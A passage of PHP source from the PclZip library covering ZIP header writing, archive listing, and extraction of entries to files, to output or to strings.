    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  fseek($v_file_compressed, 10);
  $v_size = $p_header['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file_compressed, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file_compressed);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privCalculateStoredFilename(&$p_filedescr, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];
  if (isset($p_options[PCLZIP_OPT_ADD_PATH])) {
    $p_add_dir = $p_options[PCLZIP_OPT_ADD_PATH];
  }
  else {
    $p_add_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_PATH])) {
    $p_remove_dir = $p_options[PCLZIP_OPT_REMOVE_PATH];
  }
  else {
    $p_remove_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
    $p_remove_all_dir = $p_options[PCLZIP_OPT_REMOVE_ALL_PATH];
  }
  else {
    $p_remove_all_dir = 0;
  }


  if (isset($p_filedescr['new_full_name'])) {
    $v_stored_filename = PclZipUtilTranslateWinPath($p_filedescr['new_full_name']);
  }
  
  else {

    if (isset($p_filedescr['new_short_name'])) {
      $v_path_info = pathinfo($p_filename);
      $v_dir = '';
      if ($v_path_info['dirname'] != '') {
        $v_dir = $v_path_info['dirname'].'/';
      }
      $v_stored_filename = $v_dir.$p_filedescr['new_short_name'];
    }
    else {
      $v_stored_filename = $p_filename;
    }

    if ($p_remove_all_dir) {
      $v_stored_filename = basename($p_filename);
    }
    else if ($p_remove_dir != "") {
      if (substr($p_remove_dir, -1) != '/')
        $p_remove_dir .= "/";

      if (   (substr($p_filename, 0, 2) == "./")
          || (substr($p_remove_dir, 0, 2) == "./")) {
          
        if (   (substr($p_filename, 0, 2) == "./")
            && (substr($p_remove_dir, 0, 2) != "./")) {
          $p_remove_dir = "./".$p_remove_dir;
        }
        if (   (substr($p_filename, 0, 2) != "./")
            && (substr($p_remove_dir, 0, 2) == "./")) {
          $p_remove_dir = substr($p_remove_dir, 2);
        }
      }

      $v_compare = PclZipUtilPathInclusion($p_remove_dir,
                                           $v_stored_filename);
      if ($v_compare > 0) {
        if ($v_compare == 2) {
          $v_stored_filename = "";
        }
        else {
          $v_stored_filename = substr($v_stored_filename,
                                      strlen($p_remove_dir));
        }
      }
    }
    
    $v_stored_filename = PclZipUtilTranslateWinPath($v_stored_filename);
    
    if ($p_add_dir != "") {
      if (substr($p_add_dir, -1) == "/")
        $v_stored_filename = $p_add_dir.$v_stored_filename;
      else
        $v_stored_filename = $p_add_dir."/".$v_stored_filename;
    }
  }

  $v_stored_filename = PclZipUtilPathReduction($v_stored_filename);
  $p_filedescr['stored_filename'] = $v_stored_filename;
  
  return $v_result;
}

function privWriteFileHeader(&$p_header)
{
  $v_result=1;

  $p_header['offset'] = ftell($this->zip_fd);

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];

  $v_binary_data = pack("VvvvvvVVVvv", 0x04034b50,
                      $p_header['version_extracted'], $p_header['flag'],
                        $p_header['compression'], $v_mtime, $v_mdate,
                        $p_header['crc'], $p_header['compressed_size'],
					  $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len']);

  fputs($this->zip_fd, $v_binary_data, 30);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }

  return $v_result;
}

function privWriteCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];


  $v_binary_data = pack("VvvvvvvVVVvvvvvVV", 0x02014b50,
                      $p_header['version'], $p_header['version_extracted'],
                        $p_header['flag'], $p_header['compression'],
					  $v_mtime, $v_mdate, $p_header['crc'],
                        $p_header['compressed_size'], $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len'], $p_header['comment_len'],
                        $p_header['disk'], $p_header['internal'],
					  $p_header['external'], $p_header['offset']);

  fputs($this->zip_fd, $v_binary_data, 46);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }
  if ($p_header['comment_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['comment'], $p_header['comment_len']);
  }

  return $v_result;
}

function privWriteCentralHeader($p_nb_entries, $p_size, $p_offset, $p_comment)
{
  $v_result=1;

  $v_binary_data = pack("VvvvvVVv", 0x06054b50, 0, 0, $p_nb_entries,
                      $p_nb_entries, $p_size,
					  $p_offset, strlen($p_comment));

  fputs($this->zip_fd, $v_binary_data, 22);

  if (strlen($p_comment) != 0)
  {
    fputs($this->zip_fd, $p_comment, strlen($p_comment));
  }

  return $v_result;
}

function privList(&$p_list)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
  {
    $this->privSwapBackMagicQuotes();
    
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

    return PclZip::errorCode();
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_central_dir['offset']))
  {
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  for ($i=0; $i<$v_central_dir['entries']; $i++)
  {
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return $v_result;
    }
    $v_header['index'] = $i;

    $this->privConvertHeader2FileInfo($v_header, $p_list[$i]);
    unset($v_header);
  }

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privConvertHeader2FileInfo($p_header, &$p_info)
{
  $v_result=1;

  $v_temp_path = PclZipUtilPathReduction($p_header['filename']);
  $p_info['filename'] = $v_temp_path;
  $v_temp_path = PclZipUtilPathReduction($p_header['stored_filename']);
  $p_info['stored_filename'] = $v_temp_path;
  $p_info['size'] = $p_header['size'];
  $p_info['compressed_size'] = $p_header['compressed_size'];
  $p_info['mtime'] = $p_header['mtime'];
  $p_info['comment'] = $p_header['comment'];
  $p_info['folder'] = (($p_header['external']&0x00000010)==0x00000010);
  $p_info['index'] = $p_header['index'];
  $p_info['status'] = $p_header['status'];
  $p_info['crc'] = $p_header['crc'];

  return $v_result;
}

function privExtractByRule(&$p_file_list, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (   ($p_path == "")
    || (   (substr($p_path, 0, 1) != "/")
	    && (substr($p_path, 0, 3) != "../")
		&& (substr($p_path,1,2)!=":/")))
    $p_path = "./".$p_path;

  if (($p_path != "./") && ($p_path != "/"))
  {
    while (substr($p_path, -1) == "/")
    {
      $p_path = substr($p_path, 0, strlen($p_path)-1);
    }
  }

  if (($p_remove_path != "") && (substr($p_remove_path, -1) != '/'))
  {
    $p_remove_path .= '/';
  }
  $p_remove_path_size = strlen($p_remove_path);

  if (($v_result = $this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_pos_entry = $v_central_dir['offset'];

  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    @rewind($this->zip_fd);
    if (@fseek($this->zip_fd, $v_pos_entry))
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

      return PclZip::errorCode();
    }

    $v_header = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      return $v_result;
    }

    $v_header['index'] = $i;

    $v_pos_entry = ftell($this->zip_fd);

    $v_extract = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_extract); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_extract = true;
                }
            }
            elseif ($v_header['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_extract = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header['stored_filename'])) {
            $v_extract = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {
        
        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_extract); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_extract = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }

    else {
        $v_extract = true;
    }

  if (   ($v_extract)
      && (   ($v_header['compression'] != 8)
	      && ($v_header['compression'] != 0))) {
        $v_header['status'] = 'unsupported_compression';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();
            
            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_COMPRESSION,
		                       "Filename '".$v_header['stored_filename']."' is "
			  	    	  	   ."compressed by an unsupported compression "
			  	    	  	   ."method (".$v_header['compression'].") ");

            return PclZip::errorCode();
	  }
  }
  
  if (($v_extract) && (($v_header['flag'] & 1) == 1)) {
        $v_header['status'] = 'unsupported_encryption';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();

            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION,
		                       "Unsupported encryption for "
			  	    	  	   ." filename '".$v_header['stored_filename']
							   ."'");

            return PclZip::errorCode();
	  }
  }

    if (($v_extract) && ($v_header['status'] != 'ok')) {
        $v_result = $this->privConvertHeader2FileInfo($v_header,
	                                        $p_file_list[$v_nb_extracted++]);
        if ($v_result != 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            return $v_result;
        }

        $v_extract = false;
    }
    
    if ($v_extract)
    {

      @rewind($this->zip_fd);
      if (@fseek($this->zip_fd, $v_header['offset']))
      {
        $this->privCloseFd();

        $this->privSwapBackMagicQuotes();

        PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

        return PclZip::errorCode();
      }

      if ($p_options[PCLZIP_OPT_EXTRACT_AS_STRING]) {

        $v_string = '';

        $v_result1 = $this->privExtractFileAsString($v_header, $v_string, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        $p_file_list[$v_nb_extracted]['content'] = $v_string;

        $v_nb_extracted++;
        
        if ($v_result1 == 2) {
        	break;
        }
      }
      elseif (   (isset($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT]))
	        && ($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT])) {
        $v_result1 = $this->privExtractFileInOutput($v_header, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
      else {
        $v_result1 = $this->privExtractFile($v_header,
	                                      $p_path, $p_remove_path,
										  $p_remove_all_path,
										  $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
    }
  }

  $this->privCloseFd();
  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privExtractFile(&$p_entry, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if ($p_remove_all_path == true) {
      if (($p_entry['external']&0x00000010)==0x00000010) {

          $p_entry['status'] = "filtered";

          return $v_result;
      }

      $p_entry['filename'] = basename($p_entry['filename']);
  }

  else if ($p_remove_path != "")
  {
    if (PclZipUtilPathInclusion($p_remove_path, $p_entry['filename']) == 2)
    {

      $p_entry['status'] = "filtered";

      return $v_result;
    }

    $p_remove_path_size = strlen($p_remove_path);
    if (substr($p_entry['filename'], 0, $p_remove_path_size) == $p_remove_path)
    {

      $p_entry['filename'] = substr($p_entry['filename'], $p_remove_path_size);

    }
  }

  if ($p_path != '') {
    $p_entry['filename'] = $p_path."/".$p_entry['filename'];
  }
  
  if (isset($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION])) {
    $v_inclusion
    = PclZipUtilPathInclusion($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION],
                              $p_entry['filename']); 
    if ($v_inclusion == 0) {

      PclZip::privErrorLog(PCLZIP_ERR_DIRECTORY_RESTRICTION,
		                     "Filename '".$p_entry['filename']."' is "
							 ."outside PCLZIP_OPT_EXTRACT_DIR_RESTRICTION");

      return PclZip::errorCode();
    }
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

  if (file_exists($p_entry['filename']))
  {

    if (is_dir($p_entry['filename']))
    {

      $p_entry['status'] = "already_a_directory";
      
      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_ALREADY_A_DIRECTORY,
		                     "Filename '".$p_entry['filename']."' is "
							 ."already used by an existing directory");

          return PclZip::errorCode();
	    }
    }
    else if (!is_writeable($p_entry['filename']))
    {

      $p_entry['status'] = "write_protected";

      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		                     "Filename '".$p_entry['filename']."' exists "
							 ."and is write protected");

          return PclZip::errorCode();
	    }
    }

    else if (filemtime($p_entry['filename']) > $p_entry['mtime'])
    {
      if (   (isset($p_options[PCLZIP_OPT_REPLACE_NEWER]))
	    && ($p_options[PCLZIP_OPT_REPLACE_NEWER]===true)) {
  	  }
	    else {
          $p_entry['status'] = "newer_exist";

          if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	        && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

              PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		             "Newer version of '".$p_entry['filename']."' exists "
				    ."and option PCLZIP_OPT_REPLACE_NEWER is not selected");

              return PclZip::errorCode();
	      }
	    }
    }
    else {
    }
  }

  else {
    if ((($p_entry['external']&0x00000010)==0x00000010) || (substr($p_entry['filename'], -1) == '/'))
      $v_dir_to_check = $p_entry['filename'];
    else if (!strstr($p_entry['filename'], "/"))
      $v_dir_to_check = "";
    else
      $v_dir_to_check = dirname($p_entry['filename']);

      if (($v_result = $this->privDirCheck($v_dir_to_check, (($p_entry['external']&0x00000010)==0x00000010))) != 1) {

        $p_entry['status'] = "path_creation_fail";

        $v_result = 1;
      }
    }
  }

  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010))
    {
      if ($p_entry['compression'] == 0) {

        if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0)
        {

          $p_entry['status'] = "write_error";

          return $v_result;
        }


        $v_size = $p_entry['compressed_size'];
        while ($v_size != 0)
        {
          $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
          $v_buffer = @fread($this->zip_fd, $v_read_size);
          @fwrite($v_dest_file, $v_buffer, $v_read_size);            
          $v_size -= $v_read_size;
        }

        fclose($v_dest_file);

        touch($p_entry['filename'], $p_entry['mtime']);
        

      }
      else {
        if (($p_entry['flag'] & 1) == 1) {
          PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION, 'File \''.$p_entry['filename'].'\' is encrypted. Encrypted files are not supported.');
          return PclZip::errorCode();
        }


        if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
            && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
                || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                    && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_entry['size'])) ) ) {
          $v_result = $this->privExtractFileUsingTempFile($p_entry, $p_options);
          if ($v_result < PCLZIP_ERR_NO_ERROR) {
            return $v_result;
          }
        }
        
        else {

        
          $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
          
          $v_file_content = @gzinflate($v_buffer);
          unset($v_buffer);
          if ($v_file_content === FALSE) {

            $p_entry['status'] = "error";
            
            return $v_result;
          }
          
          if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {

            $p_entry['status'] = "write_error";

            return $v_result;
          }

          @fwrite($v_dest_file, $v_file_content, $p_entry['size']);
          unset($v_file_content);

          @fclose($v_dest_file);
          
        }

        @touch($p_entry['filename'], $p_entry['mtime']);
      }

      if (isset($p_options[PCLZIP_OPT_SET_CHMOD])) {

        @chmod($p_entry['filename'], $p_options[PCLZIP_OPT_SET_CHMOD]);
      }

    }
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileUsingTempFile(&$p_entry, &$p_options)
{
  $v_result=1;
      
  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_dest_file = @fopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }


  $v_binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($p_entry['compression']), Chr(0x00), time(), Chr(0x00), Chr(3));
  @fwrite($v_dest_file, $v_binary_data, 10);

  $v_size = $p_entry['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_binary_data = pack('VV', $p_entry['crc'], $p_entry['size']);
  @fwrite($v_dest_file, $v_binary_data, 8);

  @fclose($v_dest_file);

  if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {
    $p_entry['status'] = "write_error";
    return $v_result;
  }

  if (($v_src_file = @gzopen($v_gzip_temp_name, 'rb')) == 0) {
    @fclose($v_dest_file);
    $p_entry['status'] = "read_error";
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }


  $v_size = $p_entry['size'];
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @gzread($v_src_file, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }
  @fclose($v_dest_file);
  @gzclose($v_src_file);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privExtractFileInOutput(&$p_entry, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1) {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }

    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compressed_size'] == $p_entry['size']) {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);

        echo $v_buffer;
        unset($v_buffer);
      }
      else {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        $v_file_content = gzinflate($v_buffer);
        unset($v_buffer);

        echo $v_file_content;
        unset($v_file_content);
      }
    }
  }

if ($p_entry['status'] == "aborted") {
    $p_entry['status'] = "skipped";
}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileAsString(&$p_entry, &$p_string, &$p_options)
{
  $v_result=1;

  $v_header = array();
  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compression'] == 0) {

        $p_string = @fread($this->zip_fd, $p_entry['compressed_size']);
      }
      else {

        $v_data = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        if (($p_string = @gzinflate($v_data)) === FALSE) {
        }
      }

    }
    else {
    }
    
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);
    
    $v_local_header['content'] = $p_string;
    $p_string = '';

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    $p_string = $v_local_header['content'];
    unset($v_local_header['content']);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privReadFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x04034b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 26);

  if (strlen($v_binary_data) != 26)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $v_binary_data);

  $p_header['filename'] = fread($this->zip_fd, $v_data['filename_len']);

  if ($v_data['extra_len'] != 0) {
    $p_header['extra'] = fread($this->zip_fd, $v_data['extra_len']);
  }
  else {
    $p_header['extra'] = '';
  }

  $p_header['version_extracted'] = $v_data['version'];
  $p_header['compression'] = $v_data['compression'];
  $p_header['size'] = $v_data['size'];
  $p_header['compressed_size'] = $v_data['compressed_size'];
  $p_header['crc'] = $v_data['crc'];
  $p_header['flag'] = $v_data['flag'];
  $p_header['filename_len'] = $v_data['filename_len'];

  $p_header['mdate'] = $v_data['mdate'];
  $p_header['mtime'] = $v_data['mtime'];
  if ($p_header['mdate'] && $p_header['mtime'])
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }


  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = "ok";

  return $v_result;
}

function privReadCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x02014b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 42);

  if (strlen($v_binary_data) != 42)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $p_header = unpack('vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $v_binary_data);

  if ($p_header['filename_len'] != 0)
    $p_header['filename'] = fread($this->zip_fd, $p_header['filename_len']);
  else
    $p_header['filename'] = '';

  if ($p_header['extra_len'] != 0)
    $p_header['extra'] = fread($this->zip_fd, $p_header['extra_len']);
  else
    $p_header['extra'] = '';

  if ($p_header['comment_len'] != 0)
